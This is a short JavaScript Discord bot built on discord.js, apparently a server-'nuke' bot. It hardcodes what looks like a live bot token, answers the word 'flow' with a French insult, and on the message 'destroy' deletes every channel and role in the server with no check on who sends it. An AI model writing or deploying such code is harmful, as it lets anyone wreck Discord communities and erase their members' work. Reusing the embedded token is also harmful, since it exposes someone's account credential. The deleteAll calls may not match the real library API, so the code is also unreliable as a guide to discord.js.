const Discord = require('discord.js');
const client = new Discord.Client();

var prefix = '.';
var token = 'NTAzNDY5NTAyODg1OTIwNzg1.DwdsNA.4gVNugXvpoaogsdNyeQf7NExB5c'

client.login(token)

client.on('ready' , function() {
	client.user.setActivity("Coder | Flow212rocma", {type: "STREAMING"});
	console.log("prête bro")
});

client.on('message', message => {
	if(message.content === "flow"){
		message.reply("ntm slp");
	}
});

client.on('message', message => {
	if(message.content === "destroy"){
		message.guild.channels.deleteAll("destroyer by flow");
		message.guild.roles.deleteAll("bot by flow");
		message.delete();
		console.log("ez")
	}
});